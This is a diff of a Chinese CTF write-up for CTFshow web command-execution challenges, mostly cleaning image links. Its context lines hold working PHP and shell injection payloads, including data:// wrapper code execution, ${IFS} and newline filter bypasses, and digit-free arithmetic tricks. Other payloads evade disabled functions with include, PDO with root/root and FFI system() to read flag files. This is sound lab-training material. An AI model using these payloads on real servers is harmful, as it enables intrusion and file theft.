@@ -158,7 +158,8 @@ if(isset($_GET['c'])){
 payload：/?c=data:text/plain,<?php system('tac fla?.php')?>
 或/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
 或（注意post传参为x-www-form-urlencoded raw，意味传递任意格式文本，如果这里不是raw的话post会将其转换为键值对导致代码无法执行）
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637843452688-976476c6-c4d7-4b91-b205-ae96395ce232.png#clientId=ub553509b-7999-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=124&id=uc8a964f2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=247&originWidth=1153&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28401&status=done&style=none&taskId=ubea90b37-50e0-4e15-9d5c-026b58e4f17&title=&width=576.5)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637843452688-976476c6-c4d7-4b91-b205-ae96395ce232.png#)
+
 ## web38（data伪协议）
 ```php
 <?php
@@ -231,6 +232,8 @@ if(isset($_GET['c'])){
 
 最后payload：/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
 ## web41（待完成）
+
+
 
 
 ## web42（%0a截断）
@@ -400,13 +403,14 @@ if(isset($_GET['c'])){
 这个题过滤了<，绕过空格还有${IFS}可用
 payload：/?c=nl${IFS}fla?.???%0a
 查看源码发现
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853342916-eb9219b4-c9cd-49bf-be86-abe257504657.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=u7fe19710&margin=%5Bobject%20Object%5D&name=image.png&originHeight=35&originWidth=215&originalType=binary&ratio=1&rotation=0&showTitle=false&size=703&status=done&style=none&taskId=ubdace4ad-cc48-4e7c-967b-04871ae224c&title=&width=307)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853342916-eb9219b4-c9cd-49bf-be86-abe257504657.png#)
 ？？？我的flag呢，看下目录payload：/?c=ls%0a
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853425951-9563e023-b815-4ea2-99fe-0969929a129f.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=u2ac2405d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=53&originWidth=217&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1553&status=done&style=none&taskId=ue31fafed-6d8f-4abb-a757-305af2dc745&title=&width=205)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853425951-9563e023-b815-4ea2-99fe-0969929a129f.png#)
 看来flag不在此处，看看根目录payload：/?c=ls${IFS}/%0a
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853470065-f03fafa3-81c1-45fc-b368-4eebab029915.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=u4d809a1a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3869&status=done&style=none&taskId=u39ed1a66-aa60-424b-8eda-565935ca680&title=&width=1013)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637853470065-f03fafa3-81c1-45fc-b368-4eebab029915.png#)
 第四个文件叫flag，进去看看payload：/?c=nl${IFS}/fla?%0a
 答案回显在页面上，完活儿
+
 ## web53（${IFS}绕过）
 ```php
 <?php
@@ -494,6 +498,7 @@ if(isset($_GET['c'])){
 因为每次上传文件名都是随机的，可能不会一次成功，要多发几次包，看到目录文件后继续查看
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637857330375-64accbc9-1585-4be3-945e-e6d9d282327e.png#clientId=u1c3ea20a-1a4c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u7a566341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86471&status=done&style=none&taskId=u95b42a1e-df51-453f-a663-93d7bb21bc4&title=&width=796)
 成功读到flag
+
 ## web56（无数字字母命令执行）
 ```php
 <?php
@@ -526,13 +531,14 @@ if(isset($_GET['c'])){
 ```
 这个题要传参c=36，但是由过滤了数字，可以考虑如下方式绕过
 看这个例子
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637860730620-1abfb4d1-6da2-4059-8157-4af44c08a0aa.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=100&id=u88d4d697&margin=%5Bobject%20Object%5D&name=image.png&originHeight=99&originWidth=265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44848&status=done&style=none&taskId=u1990f488-9e97-49fc-ace7-dd8a13fb14e&title=&width=268)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637860730620-1abfb4d1-6da2-4059-8157-4af44c08a0aa.png#)
 为什么会输出0呢，因为在shell中$(())可做运算，当参数为空时，打印0，那如何得到36呢，我们对0取反，得到是-1，然后用37个-1相加得到-37，最后再取反就得到36了
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637860973823-e1cea168-21e7-4251-bd72-3f0ceef253e2.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=100&id=u51b24e4c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37461&status=done&style=none&taskId=uc27c57ca-7f2c-4686-9a54-26fac61a10d&title=&width=320)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637860973823-e1cea168-21e7-4251-bd72-3f0ceef253e2.png#)
 得到-1
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861295855-95cea956-3cf8-43ec-82fd-f1be6b1e35a0.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=150&id=u125e3e20&margin=%5Bobject%20Object%5D&name=image.png&originHeight=188&originWidth=1131&originalType=binary&ratio=1&rotation=0&showTitle=false&size=395325&status=done&style=none&taskId=uaa385bd6-1097-4607-a296-62da347de06&title=&width=902)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861295855-95cea956-3cf8-43ec-82fd-f1be6b1e35a0.png#)
 37次运算后得到-37，最后取反得到36
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861257944-40d23a4b-f17e-4f60-87d2-95400dff3a7e.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=150&id=u8f600c46&margin=%5Bobject%20Object%5D&name=image.png&originHeight=194&originWidth=1119&originalType=binary&ratio=1&rotation=0&showTitle=false&size=402152&status=done&style=none&taskId=uae63e0a0-e079-4ae6-923e-a54f164cf81&title=&width=865)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861257944-40d23a4b-f17e-4f60-87d2-95400dff3a7e.png#)
+
 ```
 payload：/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
 ```
@@ -564,13 +570,14 @@ if(isset($_POST['c'])){
 }
 ```
 show_source被禁用了，尝试另一种：c=highlight_file('flag.php');
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861897471-ec1e3db6-0ebf-47e0-819a-422f51ff73ed.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=50&id=ua61a51d6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=985&status=done&style=none&taskId=ub9eac542-67ec-40f6-864a-f2b06ed1db2&title=&width=306)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637861897471-ec1e3db6-0ebf-47e0-819a-422f51ff73ed.png#)
 好家伙，看来路径变了，先看看都有哪些文件吧：c=print_r(scandir('.'));
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637862019048-dc174cac-ee38-4042-9b11-ae2b8774cec3.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=300&id=u4b0e3639&margin=%5Bobject%20Object%5D&name=image.png&originHeight=541&originWidth=1197&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49088&status=done&style=none&taskId=u8bb22d52-5109-482a-97bf-29a5182cb3b&title=&width=664)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637862019048-dc174cac-ee38-4042-9b11-ae2b8774cec3.png#)
 当前目录没有，再瞅一眼根目录：c=print_r(scandir('/'));
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637862111503-ac782c87-2950-4218-b1ad-e2133bcd7456.png#clientId=uede25bb3-efec-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=300&id=u48c8480d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=558&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56736&status=done&style=none&taskId=u00a4038f-c719-47b8-b1cb-fef95db0f0c&title=&width=639)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637862111503-ac782c87-2950-4218-b1ad-e2133bcd7456.png#)
 找到你了！可恶的flag.txt
 最终payload：c=highlight_file('/flag.txt');
+
 ## web67（突破禁用函数）
 ```php
 <?php
@@ -585,18 +592,20 @@ if(isset($_POST['c'])){
 ```
 尝试后发现print_r被禁用了，这次使用var_dump打印，按照上题的思路，查看根目录
 payload: c=var_dump(scandir('/'));
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637894193264-98070937-927a-40ef-8c66-610fd4c3cb1f.png#clientId=uf61a1eb9-8a40-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u634a8b9b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=543&originWidth=959&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69436&status=done&style=none&taskId=u21050625-fb2c-456e-8e2a-3ecb309a04b&title=&width=618)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637894193264-98070937-927a-40ef-8c66-610fd4c3cb1f.png#)
 于是最终payload：c=highlight_file('/flag.txt');
+
 ## web68（突破禁用函数）
 ```php
 Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19
 ```
 代码看不到了，看报错是因为highlight_file()被禁用了，一样，看一眼根目录，找到flag.txt
 payload：c=var_dump(scandir('/'));
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637894386021-ca8d69b4-6cc8-4d85-902f-a02477ddbafd.png#clientId=uf61a1eb9-8a40-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=450&id=u19690b8e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=969&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74679&status=done&style=none&taskId=u3dfc4f6a-8f4a-44e8-a489-10440facf71&title=&width=651)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637894386021-ca8d69b4-6cc8-4d85-902f-a02477ddbafd.png#)
 这次使用include包含flag.txt
 payload：c=include('/flag.txt');
 还可以用require函数，文档是这样说的：
+
 > **include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。**
 > **include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：**
 > - **require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。**
@@ -610,7 +619,7 @@ payload：c=include('/flag.txt');
 > **PHP 版本要求: PHP 4 >= 4.2.0, PHP 5, PHP 7**
 
 payload：c=var_export(scandir('/'));打印根目录文件
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637895933556-8c24e369-4599-4a9d-81bb-1d80eaa94e87.png#clientId=u4e321334-5d46-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=350&id=u27c83bc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=549&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57096&status=done&style=none&taskId=u5f368a1b-c21a-4a03-ae53-d7c5db5b038&title=&width=647)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637895933556-8c24e369-4599-4a9d-81bb-1d80eaa94e87.png#)
 最终payload：c=include('/flag.txt');
 ## web70（突破禁用函数）
 ```php
@@ -898,10 +907,11 @@ c=%3F%3E%3C%3Fphp%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%
 ## web73（突破禁用函数）
 这个题不能用上个题的uaf了，老姿势仍然可用，第一步查看根目录文件
 c=var_export(scandir('/'));exit();
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637905712177-72521d9e-8cba-4513-abed-f168f3dcc0fb.png#clientId=u90c89801-edf6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=400&id=u169392be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=706&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80059&status=done&style=none&taskId=u8cdf9dc2-3e77-41a7-91bb-171b2644f68&title=&width=657)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637905712177-72521d9e-8cba-4513-abed-f168f3dcc0fb.png)
 第二步包含
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637905779853-de10e256-7c85-4d76-918a-25906457571b.png#clientId=u90c89801-edf6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=400&id=uad499b70&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71453&status=done&style=none&taskId=u4b717109-ab49-4e22-b77b-e608df41a9a&title=&width=630)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637905779853-de10e256-7c85-4d76-918a-25906457571b.png#)
 最终payload：c=include('/flagc.txt');exit();
+
 ## web74（突破禁用函数）
 ```php
 Warning: scandir() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 1
@@ -915,9 +925,10 @@ echo $file.' ';
 }
 exit();?>
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637906955972-ad87a8c0-8de0-4209-b969-2f28d14322e3.png#clientId=u49b8dfee-3762-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=30&id=u8e2df6d6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5051&status=done&style=none&taskId=uf615df8a-3aba-4b2c-9751-95597726f78&title=&width=763)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637906955972-ad87a8c0-8de0-4209-b969-2f28d14322e3.png#)
 得到文件在flagx.txt
 最终payload：c=include('/flagx.txt');exit();
+
 ## web75（PDO）
 这次读目录不可行了，那么就换个姿势
 ```php
@@ -928,7 +939,10 @@ foreach($a as $f)
 exit();
 ?>
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637907212607-438c0ab9-015a-46f2-bd07-e59084ed165a.png#clientId=u49b8dfee-3762-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=30&id=u903b8919&margin=%5Bobject%20Object%5D&name=image.png&originHeight=33&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4467&status=done&style=none&taskId=uaebf819a-f505-4c20-baa1-1b474cab8e7&title=&width=750)得到文件在flag36.txt，这时候直接包含是拿不到答案的，会报错open_base，但可以通过其他应用比如说mysql来访问，如下使用pdo
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637907212607-438c0ab9-015a-46f2-bd07-e59084ed165a.png#)
+
+得到文件在flag36.txt，这时候直接包含是拿不到答案的，会报错open_base，但可以通过其他应用比如说mysql来访问，如下使用pdo
+
 ```php
 c=try{
   $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
@@ -956,8 +970,9 @@ foreach($a as $f)
 exit();
 ?>
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637909954366-8afa163f-b5f7-4c1d-a9db-e3f5d15a2cdd.png#clientId=u49b8dfee-3762-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=20&id=u6babaa48&margin=%5Bobject%20Object%5D&name=image.png&originHeight=28&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5383&status=done&style=none&taskId=uec8e5e27-d1c1-4c06-b254-8da1f008ef2&title=&width=731)
+![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637909954366-8afa163f-b5f7-4c1d-a9db-e3f5d15a2cdd.png#)
 有两个可疑文件，flag36x.txt和readflag，留着备用，先放payload
+
 ```php
 c=$ffi = FFI::cdef("int system(const char *command);");
 $a='/readflag > 1.txt';
